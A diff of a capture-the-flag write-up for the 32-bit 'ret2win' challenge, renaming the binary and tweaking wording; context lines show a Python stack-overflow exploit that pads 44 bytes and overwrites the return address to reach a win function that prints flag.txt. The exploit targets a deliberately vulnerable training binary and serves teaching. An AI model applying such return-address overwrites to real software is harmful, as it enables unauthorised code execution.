@@ -3,7 +3,7 @@
 Let's see what the binary does:
 
 ```
-./ret2win
+./ret2win32
 ```
 
 ![](0.png)
@@ -16,7 +16,7 @@ Let's start investigating:
 1. Is it possible to overwrite the return address easily?
 2. If so, where will we direct the program?
 
-Remember that the goal is to print the contents of `flag.txt`
+(Remember: the goal is to print the contents of `flag.txt`)
 
 ## Exploration
 ### Is it possible to overwrite the return address easily?
@@ -65,7 +65,7 @@ garbage      = b'A'*44
 ret2win_addr = struct.pack("<L", 0x0804862c)
 expoit       = garbage + ret2win_addr
 
-# using this output as ./ret2win input
+# using this output as ./ret2win32 input
 print(expoit)
 """
 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,\x86\x04\x08'
